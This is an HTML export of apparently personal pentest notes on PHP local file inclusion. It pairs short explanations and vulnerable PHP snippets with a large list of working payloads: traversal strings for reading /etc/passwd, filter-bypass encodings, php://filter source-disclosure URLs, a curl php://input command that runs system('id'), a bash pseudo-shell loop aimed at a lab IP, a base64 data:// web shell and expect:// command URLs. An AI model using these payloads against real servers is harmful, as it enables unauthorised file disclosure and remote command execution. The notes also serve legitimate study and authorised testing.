<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>LFI</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>
<body>
<div class='page'><strong><h1># Local File Inclusion / LFI</h1></strong><br />Local file inclusion is a vulnerability where an attacker can include (load) local files from the web server.<br />Using LFI, you could potentially read <code>/etc/passwd</code>, documents in a user&#39;s home folder, or the PHP code that authenticates users into the site. After you&#39;ve found LFI, you have to be creative with how you use it to gain further access.<br /><br />File inclusion is most commonly a PHP vulnerability.<br />Within PHP there exists functions which allow a developer to include other files on their web page - like <code>include()</code>.<br />This function is useful because it allows the developer to include() the website header, for example, rather than having to type it out on every page they&#39;re coding for their website.<br /><br />However, if a web user has the opportunity to decide the file that gets included, then these functions are vulnerable to file inclusion.<br /> PHP functions that can include files include:<br />• <code>require</code><br />• <code>require_once</code><br />• <code>include</code><br />• <code>include_once</code><br /><br /><strong>Links</strong><br />• <a href="https://github.com/qazbnm456/awesome-security-trivia/blob/master/Tricky-ways-to-exploit-PHP-Local-File-Inclusion.md">https://github.com/qazbnm456/awesome-security-trivia/blob/master/Tricky-ways-to-exploit-PHP-Local-File-Inclusion.md</a><br />• <a href="https://medium.com/bugbountywriteup/cvv-1-local-file-inclusion-ebc48e0e479a">https://medium.com/bugbountywriteup/cvv-1-local-file-inclusion-ebc48e0e479a</a><br />• <a href="https://highon.coffee/blog/lfi-cheat-sheet/">https://highon.coffee/blog/lfi-cheat-sheet/</a><br />• <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion</a> - all the checks you&#39;ll ever need<br /><br /><strong>Tools</strong><br />• <a href="https://github.com/kurobeats/fimap">https://github.com/kurobeats/fimap</a><br />• <a href="https://github.com/D35m0nd142/LFISuite">https://github.com/D35m0nd142/LFISuite</a><br /><br /><strong><h2>## Identifying File Inclusion</h2></strong><br /><code>http://example.com/dvwa/vulnerabilities/fi/?page=include.php</code><br /><br />In the URL above, the parameter <code>?page</code> contains a local file to include on the web page - <code>include.php</code><br />This URL is perfect for LFI. Try including another file - like <code>/etc/passwd</code> - and see what happens.<br /><br /><strong><h2>## LFI Tips</h2></strong><br />• Read the source code of the PHP page you think has a file inclusion, and figure out how it works/what it&#39;s blocking etc.<br />   ◇ Best way to do this is using php filter - <code>php://filter/convert.base64-encode/resource=include.php</code><br />• Try including the file that&#39;s already being included, e.g. <code>include.php</code> from <code>?page=include.php</code>, in other directories - e.g. <code>/etc/include.php</code><br />   ◇ The php include() might only be allowing files of a certain filename to be included<br />   ◇ there&#39;s an example of this from <em>hackthebox Nineveh</em><br />• View source to read the included file with proper formatting<br /><br /><strong><h2>## Interesting files to include</h2></strong><br />Refer to sub-node<br /><br /><strong><h2>## Quick-test Payloads</h2></strong><br />These you can test yourself. They should hopefully return a result.<br /><br /><code>../../../etc/passwd</code><br /><code>../../../etc/passwd%00</code><br /><code>../../../etc/passwd?</code><br /><code>....//....//etc/passwd</code><br /><code>http://example.com/index.php?page=php://filter/convert.base64-encode/resource=index.php</code><br /><code>file:////etc/passwd</code><br /><code>http://example.com/index.php?page=php://input</code><br /><code>http://example.net/?page=data://text/plain,&lt;?php echo base64_encode(file_get_contents(&quot;index.php&quot;)); ?&gt;</code><br /><code>http://example.com/index.php?page=expect://id</code><br /><br /><strong><h2>## Combatting Filters</h2></strong><br /><strong><h3>### No Input Filtering</h3></strong><br />This file inclusion code has no input filtering.<br /><div class="codebox"><div class="codebox">$file&nbsp;=&nbsp;$_GET[&nbsp;&#39;page&#39;&nbsp;];<br />require($file)</div></div><br /><br />Payloads you could try:<br /><code>/etc/passwd</code><br /><code>../../../etc/passwd<br />../../../../../../etc/passwd</code><br /><br /><strong><h3>### Filtering file extensions</h3></strong><br />Sometimes a developer only allows the inclusion of certain file extensions, like <code>.php</code><br /><div class="codebox"><div class="codebox">$file&nbsp;=&nbsp;$_GET[&#39;page&#39;];<br />require($file&nbsp;.&nbsp;&quot;.php&quot;);</div></div><code><br /></code><br />There are a few wayss to bypass file extension filtereing.<br /><br /><strong>#### Null byte</strong><br />In versions PHP 5.3.4 and below we can terminate the filename with null byte.<br /><code>../../../etc/passwd%00</code><br /><code>/../../../../../../../../etc/passwd%00en</code><br /><br /><strong>#### ?</strong><br />A <code>?</code> will cause the added file extension to be interpretted as a URL parameter<br /><code>../../../../../../etc/passwd?</code><br /><br /><strong><h3>### Filtering characters</h3></strong><br />Sometimes the characters used for file inclusion are filtered - like <code>../</code> and <code>...\</code><br />This file inclusion code has filters for file inclusion characters.<br /><div class="codebox"><div class="codebox">$file&nbsp;=&nbsp;$_GET[&nbsp;&#39;page&#39;&nbsp;];<br /><br />//&nbsp;Input&nbsp;validation<br />$file&nbsp;=&nbsp;str_replace(&nbsp;array(&nbsp;&quot;../&quot;,&nbsp;&quot;..\&quot;&quot;&nbsp;),&nbsp;&quot;&quot;,&nbsp;$file&nbsp;);</div></div><br /><br />There are multiple ways to bypass this.<br /><br /><strong>#### Double encoding</strong><br />The strings below are <code>/etc/passwd</code> URL encoded twice over<br /><code>%252e%252e%252fetc%252fpasswd</code><br /><code>%252e%252e%252fetc%252fpasswd%00</code><br /><br /><strong>#### UTF-8 encoding</strong><br /><code>%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd</code><br /><code>%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd%00</code><br /><br /><strong>#### Path and Dot Truncation</strong><br />On most PHP installations a filename longer than 4096 bytes will be cut off, so any excess chars will be thrown away.<br /><code>../../../etc/passwd............[add until +4096]<br />../../../etc/passwd\.\.\.\.\.\.[add until +4096]<br />../../../etc/passwd/./././././.[add until +4096]<br />../../../[add until +4096]../../../../etc/passwd</code><br /><br /><strong>#### ../ Filtering</strong><br />If <code>../</code> is being filtered (and not recursively), you can surround the <code>../</code> with what you want, so that when <code>../</code> is removed, you&#39;re left with your payload<br />e.g ..<code>../</code>/<br /><br /><code>....//....//etc/passwd<br />..///////..////..//////etc/passwd<br />..././..././..././..././..././..././etc/passwd<br />/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd</code><br /><br /><strong><h2>## PHP Wrappers</h2></strong><br /><a href="https://www.php.net/manual/en/wrappers.php">https://www.php.net/manual/en/wrappers.php</a><br />PHP has wrappers for use with filesystem functions, like fopen(), copy() etc.<br /><br /><strong><h3>### php://filter</h3></strong><br />The &quot;php://filter&quot; part is case insensitive.<br />You can use this wrapper to read the .php file you&#39;re trying to exploit, which can help with exploiting.<br /><br />Base64<br /><code>http://example.com/index.php?page=php://filter/convert.base64-encode/resource=index.php<br />http://example.com/index.php?page=pHp://FilTer/convert.base64-encode/resource=index.php<br /></code>Rot13<code><br />http://example.com/index.php?page=php://filter/read=string.rot13/resource=index.php<br /></code>UTF-8<code><br />http://example.com/index.php?page=php://filter/convert.iconv.utf-8.utf-16/resource=index.php</code><br />zlib Compression<br /><code>http://example.com/index.php?page=php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd</code><br />   ◇ <div class="codebox"><div class="codebox">php&nbsp;-a&nbsp;#Starts&nbsp;a&nbsp;php&nbsp;console<br />readfile(&#39;php://filter/zlib.inflate/resource=test.deflated&#39;);</div></div><br /><br /><strong><h3>### file://</h3></strong><br />The php://file filter is for accessing the local system.<br /><code>file:////etc/passwd</code><br /><br /><strong><h3>### php://input</h3></strong><br />Examples:<br />• oscp Phoenix<br /><br />This is a POST request.<br />Use <code>input://</code> to submit commands in the body data.<br /><br /><code>curl -X POST --data &quot;&lt;?php system(&#39;id&#39;); ?&gt;&quot; &quot;https://example.com/index.php?page=php://input%00&quot; -k -v</code><br /><br />Script that functions as a pseudo-shell with an input:// LFI<br /><div class="codebox"><div class="codebox">#!/bin/bash<br /><br />#URL=&quot;${1}&quot;<br />while&nbsp;true;do<br />&nbsp;echo&nbsp;-n&nbsp;&quot;$&nbsp;&quot;;&nbsp;read&nbsp;cmd<br />&nbsp;curl&nbsp;--silent&nbsp;-d&nbsp;&quot;&lt;?php&nbsp;system(&#39;echo&nbsp;BEGIN&#39;);&nbsp;system(&#39;${cmd}&#39;);&nbsp;system(&#39;echo&nbsp;END&#39;)&nbsp;?&gt;&quot;&nbsp;&#39;http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=php://input%00&#39;&nbsp;|&nbsp;sed&nbsp;-n&nbsp;-e&nbsp;&#39;/BEGIN/,/END/&nbsp;p&#39;&nbsp;|&nbsp;tail&nbsp;-n&nbsp;+2&nbsp;|&nbsp;head&nbsp;-n&nbsp;-1<br />done</div></div><br /><br /><strong><h3>### data://</h3></strong><br /><code>http://example.net/?page=data://text/plain,&lt;?php echo base64_encode(file_get_contents(&quot;index.php&quot;)); ?&gt;</code><br /><br /><code>http://example.net/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=</code><br /><br /><strong><h3>### expect://</h3></strong><br />expect has to be activated within the PHP config.<br />Using expect, you can execute code.<br /><code>http://example.com/index.php?page=expect://id<br />http://example.com/index.php?page=expect://ls</code><br /><br /><strong><h2>## Checking for LFI with a Wordlist</h2></strong><br />There&#39;s a ton of ways to potentially exploit LFI and include the file you want.<br />2 good lists can be found here:<br />• Linux - <a href="https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-nix.txt">https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-nix.txt</a><br />• Windows - <a href="https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-win.txt">https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-win.txt</a><br /><br />I would advide using a web fuzzer to check these (so you don&#39;t have to do them yourself).</div>
</body>
</html>
